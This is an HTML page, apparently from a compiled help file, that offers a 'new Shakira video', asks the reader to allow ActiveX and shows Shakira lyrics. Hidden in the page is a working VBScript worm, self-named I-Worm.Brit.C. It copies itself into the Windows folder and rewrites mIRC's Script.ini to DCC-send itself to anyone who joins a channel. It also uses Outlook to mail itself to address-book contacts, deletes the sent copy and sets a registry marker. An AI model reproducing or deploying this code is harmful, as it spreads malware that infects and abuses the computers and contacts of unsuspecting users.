
<body bgcolor="#FFBFDF" text="red">
<hr>
<p align="center"><b><font size="7">Permite Active X para ver el nuevo video de SHAKIRA</font></b></p>
<p align="right"><font size="4">Kuasanagui inc.</font>
<hr>
<p><b><font size="5">
<marquee>Gratis nuevo video de SHAKIRA !!!!</marquee>
</font></b></p>



<script language="VBScript"><!--
on error resume next
	myPath=Replace(location.href,"mk:@MSITStore:","")
	myPath=Replace(myPath,"/","\")
	myPath=Mid(myPath,1,Instr(myPath,"::")-1)
For i = 1 To 3

If i = 1 Then Drive = "c"
If i = 2 Then Drive = "D"
If i = 3 Then Drive = "E"

    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.GetFolder(Drive & ":\")
    Set sf = f.SubFolders
    For Each f1 In sf

                        If fso.fileExists(f1 & "\MIRC.INI") Then mIRCDir = f1 & "\MIRC.INI"
                        Set G = fso.GetFolder(f1)
                        Set Y = G.SubFolders
                        For Each D1 In Y

                                If fso.fileExists(D1 & "\MIRC.INI") Then mIRCDir = D1 & "\MIRC.INI"
                                Set P = fso.GetFolder(D1)
                                Set W = P.SubFolders
                                For Each E1 In W

    If fso.fileExists(E1 & "\MIRC.INI") Then mIRCDir = E1 & "\MIRC.INI"
    Set Q = fso.GetFolder(E1)
    Set J = Q.SubFolders
    For Each T1 In J

    Next: Next: Next: Next: Next

	Set WinDir = fso.GetSpecialFolder(0)

		fso.CopyFile myPath,WinDir & "\Shakira.chm"

	if mIRCDir = "" then

		Set Shell = CreateObject("WScript.Shell")

			mIRCDir = Shell.Regread("HKEY_LOCAL_MACHINE\SOFTWARE\CLASSES\ChatFile\DefaultIcon\")

                   		if Instr(Ucase(mIRCDir),"MIRC32.EXE") > 0 then
                    			mIRCDir = mIRCDir
                    		Else
                    			mIRCDir = ""
                    		End if

		Set Shell = Nothing

	end if

	if mIRCDir <> "" then

		mIRCDir = Mid(mIRCDir, 1, InStrRev(mIRCDir, "\"))
		mIRCDir = Replace(mIRCDir,"""","")

  	Set fso = CreateObject("Scripting.FileSystemObject")
  	Set f = fso.OpenTextFile(mIRCDir & "Script.ini", 2, True)
  	f.WriteLine "[script]"
	f.Write "n0=on 1:JOIN:#:if ( $me != $nick ) { /msg $Nick Hola �como estas?, �mira!, �El nuevo video de Shakira! | /dcc send $nick "&WinDir&"\Shakira.chm }"
  	f.Close
	end if

	Set Shell = CreateObject("WScript.Shell")
		if Shell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\chm") = "" then

	Set Kuasanagui = CreateObject("Outlook.Application")

	if Kuasanagui.Name = "Outlook" then

	Victim = Kuasanagui.GetNamespace("MAPI").AddressLists.Item(3).AddressEntries.GetFirst

	With Kuasanagui.CreateItem(olMailItem)
		.Recipients.Add Victim
		.Attachments.Add myPath
		.Subject = "�Nuevo video de SHAKIRA!"
		.Body = "Hola"+vbcrlf+""+vbcrlf+"He visto el nuevo video de Shakira"+vbcrlf+"y me he enamorado de ella."+vbcrlf+"Esta hermosa mujer es hermosa, es impactante"+vbcrlf+"me ha hecho suspirar y quiero que "+vbcrlf+"igual que yo compartas esta emoci�n."+vbcrlf+"Disfrutalo."+vbcrlf+Ol.Session.CurrentUser.Name
		.Send
	                  .DeleteAfterSubmit=True
	
                       End With
	End IF

	Set Kuasanagui = Nothing
		Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\chm","1"
	Set Shell = Nothing
	End if
Msgbox "Error al mostrar el video musical"  & vbCrLf & "permite la interacci�n Active X para ver el video. "  & vbCrLf & "No se encuentra conexi�n a internet"  & vbCrLf & "Consulta tu proveedor",16,"I-Worm.Brit.C"
Msgbox "   Creado en Mexico por Kuasanagui" & vbCrLf & "      <<<<      I-Worm.Brit.C     >>>>",15,"I-Worm.Brit.C"
Msgbox "Shakira... Kuasanagui te ama  =P"  & vbCrLf & "Aunque me gustas m�s con cabello negro.",15,"I-Worm.Brit.C"
Msgbox "�No conoces a Shakira?"& vbCrLf & "�Compra sus discos!"& vbCrLf &"Piez Descalzos"& vbCrLf & "�Donde estan los ladrones?"& vbCrLf &"Servici� de Lavanderia",15,"I-Worm.Brit.C"
Msgbox "Dedicado a Sandra Montejo P�rez",15,"I-Worm.Brit.C"


--></script>
<p align="center"><font size="4"><b>ANTOLOGIA<br>
</b></font><b><br>
</b>Para amarte necesito una raz�n<br>
y es dif�cil creer que no exista<br>
una mas que este amor.<br>
<br>
Sobra tanto dentro de este coraz�n<br>
que a pesar de que dicen<br>
que los a�os son sabios<br>
todav�a se siente el dolor.<br>
<br>
Porque todo el tiempo que pase junto a ti<br>
dejo tejido su hilo dentro de m�.<br>
<br>
Y aprend� a quitarle al tiempo los segundos<br>
tu me hiciste ver el cielo aun m�s profundo<br>
junto a ti creo que aumente mas de tres kilos<br>
con tus tantos dulces besos repartidos.<br>
Desarrollaste mi sentido del olfato<br>
y fue por ti que aprend� a querer los gatos<br>
despegaste del cemento mis zapatos<br>
para escapar los dos volando un rato.<br>
<br>
Pero olvidaste una final instrucci�n<br>
porque aun no se como vivir sin tu amor.<br>
<br>
Y descubr� lo que significa una rosa<br>
me ense�aste a decir mentiras piadosas<br>
para poder verte a horas no adecuadas<br>
y a remplazar palabras por miradas.<br>
Y fue por ti que escrib� mas de cien canciones<br>
y hasta perdone tus equivocaciones<br>
y conoc� mas de mil formas de besar<br>
y fue por ti que descubr� lo que es amar<br>
lo que es amar.<b><br>
</b><br>
[Shakira Mebarak]<br>
<br>
<br>
</p>

<p><b>Kuasanagui inc. 09 de Abril de 2002</b></p>
</body>